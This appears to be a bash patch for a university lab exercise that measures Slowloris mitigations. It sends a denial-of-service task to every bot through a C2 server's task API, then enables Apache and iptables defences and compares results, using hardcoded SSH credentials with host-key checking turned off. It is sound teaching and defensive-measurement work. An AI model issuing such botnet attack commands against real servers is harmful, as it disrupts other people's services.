#!/bin/bash
# ====================================================
#  run_full_lab_slowloris_patch.sh
#  AUA CS 232/337 — Slowloris section patch
#
#  Gaps closed
#  ───────────
#  Gap 4 (primary): run_slowloris() now runs a full
#    before → attack → enable-mitigations → after
#    experiment, not just the raw attack.
#
#  Gap 1 (secondary): slowloris.py is now invoked with
#    --duration when called directly from this script
#    (in addition to the C2 JSON path already working
#    via bot_agent.c).
#
#  Gap 5 (measurement): --connlimit-test snapshots give
#    a concrete "mitigation factor %" for Graph 3.
#
#  HOW TO APPLY
#  ────────────
#  Option A — replace the function inline:
#    Copy the run_slowloris() function below and replace
#    the existing run_slowloris() block in run_full_lab.sh.
#
#  Option B — source this file from run_full_lab.sh:
#    Add at the top of run_full_lab.sh, after the helpers:
#      [ -f run_full_lab_slowloris_patch.sh ] && \
#          source run_full_lab_slowloris_patch.sh
#    Bash function definitions override earlier ones, so
#    the sourced run_slowloris() replaces the original.
#
#  IDS INTEGRATION (ids_detector.py — Engine 16)
#  ──────────────────────────────────────────────
#  Add these two lines to ids_detector.py:
#
#    # After the other engine imports (near the top):
#    try:
#        import ids_engine_slowloris as _e16
#        _e16.register(alert)
#        E16_OK = True
#    except ImportError:
#        E16_OK = False
#        print("[IDS] INFO: ids_engine_slowloris.py not found -- Engine 16 disabled")
#
#    # In packet_handler(), alongside the other process_* calls:
#    if E16_OK:
#        _e16.process_packet(pkt)
#
#  DEFENSE DEPLOYMENT
#  ──────────────────
#  slowloris_defense.py must be present on the VICTIM VM.
#  The deploy_slowloris_defense() helper below copies it there.
# ====================================================

# ── Colours (sourced from run_full_lab.sh if present) ──────────
: "${RED:=\033[0;31m}"
: "${GRN:=\033[0;32m}"
: "${YLW:=\033[1;33m}"
: "${BLU:=\033[0;34m}"
: "${CYN:=\033[0;36m}"
: "${NC:=\033[0m}"

# ── IPs (sourced from run_full_lab.sh if present) ──────────────
: "${C2_IP:=192.168.100.10}"
: "${VICTIM_IP:=192.168.100.20}"
: "${SSH_PASS:=pass}"
: "${SSH_OPTS:=-o StrictHostKeyChecking=no -o ConnectTimeout=5}"

log()  { echo -e "${BLU}[$(date +%H:%M:%S)]${NC} $*"; }
ok()   { echo -e "${GRN}[OK]${NC} $*"; }
warn() { echo -e "${YLW}[WARN]${NC} $*"; }

c2_curl() {
    curl -s -X POST "http://${C2_IP}:5000/task" \
         -H "Content-Type: application/json" \
         -H "X-Auth-Token: aw" \
         -d "$1"
}

bot_ssh() {
    local ip="$1"; shift
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" ssh $SSH_OPTS "vboxuser@$ip" "$@" 2>/dev/null
    else
        ssh $SSH_OPTS "vboxuser@$ip" "$@" 2>/dev/null
    fi
}

bot_ssh_bg() {
    local ip="$1"; shift
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" ssh $SSH_OPTS "vboxuser@$ip" "$@" &>/dev/null &
    else
        ssh $SSH_OPTS "vboxuser@$ip" "$@" &>/dev/null &
    fi
}

scenario_pause() {
    echo ""
    echo -e "${CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYN}  $1${NC}"
    echo -e "${CYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    sleep 2
}


# ════════════════════════════════════════════════════════════════
#  HELPER: deploy slowloris_defense.py to victim VM
# ════════════════════════════════════════════════════════════════

deploy_slowloris_defense() {
    log "Deploying slowloris_defense.py to victim VM ($VICTIM_IP)..."
    if [ ! -f "slowloris_defense.py" ]; then
        warn "slowloris_defense.py not found locally — skipping deploy"
        return 1
    fi
    if command -v sshpass &>/dev/null; then
        sshpass -p "$SSH_PASS" scp $SSH_OPTS \
            slowloris_defense.py "vboxuser@$VICTIM_IP:~/lab/" 2>/dev/null && \
            ok "slowloris_defense.py deployed" || \
            warn "scp failed — mitigation demo will be skipped"
    else
        scp $SSH_OPTS slowloris_defense.py "vboxuser@$VICTIM_IP:~/lab/" 2>/dev/null && \
            ok "slowloris_defense.py deployed" || \
            warn "scp failed — mitigation demo will be skipped"
    fi
}

# ════════════════════════════════════════════════════════════════
#  HELPER: --connlimit-test snapshot (Gap 5)
#  Invokes slowloris.py --connlimit-test on the C2 VM (locally)
#  and returns the JSON result on stdout.
# ════════════════════════════════════════════════════════════════

_slowloris_connlimit_snapshot() {
    local label="$1"
    log "connlimit-test [$label]..."
    # Run from C2 VM (this machine) targeting victim
    local raw
    raw=$(python3 slowloris.py \
        --connlimit-test \
        --sockets 150 \
        "$VICTIM_IP" 2>/dev/null)

    local stats_line
    stats_line=$(echo "$raw" | grep "^\[SLOWLORIS_STATS\]")
    if [ -n "$stats_line" ]; then
        local json="${stats_line#\[SLOWLORIS_STATS\] }"
        local succeeded
        succeeded=$(echo "$json" | python3 -c \
            "import sys,json; d=json.load(sys.stdin); print(d['succeeded'])" \
            2>/dev/null || echo "?")
        local pct
        pct=$(echo "$json" | python3 -c \
            "import sys,json; d=json.load(sys.stdin); print(d['pct_open'])" \
            2>/dev/null || echo "?")
        log "[$label] succeeded=$succeeded/150  ($pct% reachable)"
        echo "$json"   # caller captures this
    else
        warn "[$label] Could not parse connlimit-test output"
        echo "{}"
    fi
}


# ════════════════════════════════════════════════════════════════
#  MAIN FUNCTION: run_slowloris()
#  Replaces the original single-shot attack with a structured
#  4-phase experiment: baseline → attack → mitigate → re-attack
# ════════════════════════════════════════════════════════════════

run_slowloris() {
    scenario_pause "ATTACK 3/7: Slowloris (Layer 7 DDoS) — with mitigation demo"

    # ── 0. Deploy defense tooling ──────────────────────────────
    deploy_slowloris_defense

    # ── 1. Baseline snapshot (mitigations OFF) ─────────────────
    log "Ensuring mitigations are OFF for clean baseline..."
    bot_ssh "$VICTIM_IP" \
        "cd ~/lab && [ -f slowloris_defense.py ] && \
         sudo python3 slowloris_defense.py --disable 2>/dev/null || true"
    sleep 2

    log "Pre-attack connection count to :80:"
    bot_ssh "$VICTIM_IP" "sudo ss -tn | grep ':80 ' | wc -l" | \
        xargs -I{} log "  Pre-attack connections = {}"

    # Gap 5: connlimit-test before mitigation
    log "── Snapshot 1/3: BEFORE mitigation ──"
    BEFORE_JSON=$(_slowloris_connlimit_snapshot "BEFORE")
    BEFORE_SUCCEEDED=$(echo "$BEFORE_JSON" | \
        python3 -c "import sys,json; d=json.load(sys.stdin); \
                    print(d.get('succeeded', 0))" 2>/dev/null || echo 0)

    # ── 2. Main attack (via C2, as original) ───────────────────
    log "Pushing Slowloris task to all bots (target: $VICTIM_IP:80, 30s)..."
    # Gap 1: --duration 30 is honoured by bot_agent.c (C path, already correct)
    # and would also be honoured by direct slowloris.py --duration 30 invocations
    c2_curl "{\"bot_id\":\"all\",\"type\":\"slowloris\",\"target_ip\":\"$VICTIM_IP\",\"target_port\":80,\"duration\":30}"
    sleep 10

    log "── Snapshot 2/3: MID-ATTACK (no mitigation) ──"
    bot_ssh "$VICTIM_IP" "sudo ss -tn | grep ':80 ' | wc -l" | \
        xargs -I{} log "  Connections to :80 = {} (Apache workers exhausting...)"

    sleep 25   # let the 30s attack finish
    ok "Slowloris attack (phase 1 — unmitigated) complete"

    # ── 3. Enable mitigations ──────────────────────────────────
    scenario_pause "DEFENSE: Enabling Slowloris mitigations on victim VM"
    log "Applying Apache mod_reqtimeout + iptables connlimit + hashlimit..."
    bot_ssh "$VICTIM_IP" \
        "cd ~/lab && [ -f slowloris_defense.py ] && \
         sudo python3 slowloris_defense.py --enable 2>&1 | tail -20 || \
         echo '[WARN] slowloris_defense.py not found on victim VM'"
    sleep 3   # give Apache time to finish reloading
    ok "Mitigations applied"

    # Gap 5: connlimit-test AFTER mitigation
    log "── Snapshot 3/3: AFTER mitigation ──"
    AFTER_JSON=$(_slowloris_connlimit_snapshot "AFTER")
    AFTER_SUCCEEDED=$(echo "$AFTER_JSON" | \
        python3 -c "import sys,json; d=json.load(sys.stdin); \
                    print(d.get('succeeded', 0))" 2>/dev/null || echo 0)

    # ── 4. Re-run attack against mitigated server ──────────────
    log "Re-running Slowloris against mitigated server (30s)..."
    c2_curl "{\"bot_id\":\"all\",\"type\":\"slowloris\",\"target_ip\":\"$VICTIM_IP\",\"target_port\":80,\"duration\":30}"
    sleep 10
    bot_ssh "$VICTIM_IP" "sudo ss -tn | grep ':80 ' | wc -l" | \
        xargs -I{} log "  Connections (mitigated server) = {} (should be << unmitigated)"
    sleep 25
    ok "Slowloris attack (phase 2 — mitigated) complete"

    # ── 5. Comparison table ────────────────────────────────────
    echo ""
    echo -e "${CYN}┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYN}│  Slowloris Mitigation — Before/After Comparison       │${NC}"
    echo -e "${CYN}├──────────────────────────────────────────────────────┤${NC}"
    printf "${CYN}│${NC}  %-30s %10s %10s ${CYN}│${NC}\n" \
        "Metric" "BEFORE" "AFTER"
    echo -e "${CYN}├──────────────────────────────────────────────────────┤${NC}"
    printf "${CYN}│${NC}  %-30s %10s %10s ${CYN}│${NC}\n" \
        "Sockets succeeded (150 tried)" \
        "$BEFORE_SUCCEEDED" "$AFTER_SUCCEEDED"

    if [ "$BEFORE_SUCCEEDED" -gt 0 ] 2>/dev/null; then
        REDUCTION=$(python3 -c \
            "b=$BEFORE_SUCCEEDED; a=$AFTER_SUCCEEDED; \
             print(f'{max(0,(b-a)/b*100):.1f}%')" 2>/dev/null || echo "?%")
    else
        REDUCTION="n/a"
    fi
    printf "${CYN}│${NC}  %-30s %21s ${CYN}│${NC}\n" \
        "Reduction" "$REDUCTION"
    echo -e "${CYN}└──────────────────────────────────────────────────────┘${NC}"
    echo ""

    # ── 6. Save graph data (Gap 4) ─────────────────────────────
    GRAPH_DATA=$(python3 - <<PYEOF
import json, sys
from datetime import datetime
b = json.loads("""$BEFORE_JSON""" or "{}")
a = json.loads("""$AFTER_JSON""" or "{}")
b_suc = b.get("succeeded", 0)
a_suc = a.get("succeeded", 0)
reduction = max(0, (b_suc - a_suc) / b_suc * 100) if b_suc > 0 else 0
data = {
    "timestamp":     datetime.now().isoformat(),
    "before":        b,
    "after":         a,
    "reduction_pct": round(reduction, 1),
    "attack_type":   "slowloris",
    "mitigations":   [
        "mod_reqtimeout header=10-20,MinRate=500",
        "iptables connlimit --connlimit-above 20",
        "iptables hashlimit 10/sec",
        "KeepAliveTimeout 5",
    ],
}
print(json.dumps(data, indent=2))
PYEOF
)
    echo "$GRAPH_DATA" > graph3_slowloris_data.json
    log "Graph data saved: graph3_slowloris_data.json"

    # ── 7. IDS alert check ─────────────────────────────────────
    log "IDS Slowloris alerts on victim VM:"
    bot_ssh "$VICTIM_IP" \
        "grep -i 'slowloris\|HALF_OPEN\|E16\|half.open' /tmp/ids.log 2>/dev/null | \
         tail -10 || echo '  (no E16 alerts yet — check ids.log manually)'"

    echo ""
    log "Mitigation status on victim VM:"
    bot_ssh "$VICTIM_IP" \
        "cd ~/lab && [ -f slowloris_defense.py ] && \
         sudo python3 slowloris_defense.py --status 2>/dev/null || \
         echo '  (slowloris_defense.py not on victim VM)'"

    ok "Slowloris scenario complete (attack + mitigation demo)"
}


# ════════════════════════════════════════════════════════════════
#  SELF-TEST: run standalone to verify helper functions work
# ════════════════════════════════════════════════════════════════

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo ""
    echo "run_full_lab_slowloris_patch.sh — standalone self-test"
    echo ""
    echo "This script is designed to be sourced by run_full_lab.sh."
    echo "To apply the patch, add to run_full_lab.sh (after the helpers):"
    echo ""
    echo "  [ -f run_full_lab_slowloris_patch.sh ] && \\"
    echo "      source run_full_lab_slowloris_patch.sh"
    echo ""
    echo "The sourced run_slowloris() will override the original function."
    echo ""
    echo "Files needed on this (C2) VM:"
    echo "  slowloris.py            — updated version with --duration, --connlimit-test"
    echo ""
    echo "Files needed on victim VM (192.168.100.20):"
    echo "  slowloris_defense.py    — Apache + iptables mitigation demonstrator"
    echo ""
    echo "Integration in ids_detector.py (Engine 16):"
    echo "  import ids_engine_slowloris as _e16"
    echo "  _e16.register(alert)        # after alert() is defined"
    echo "  # In packet_handler():"
    echo "  _e16.process_packet(pkt)    # alongside other process_* calls"
fi
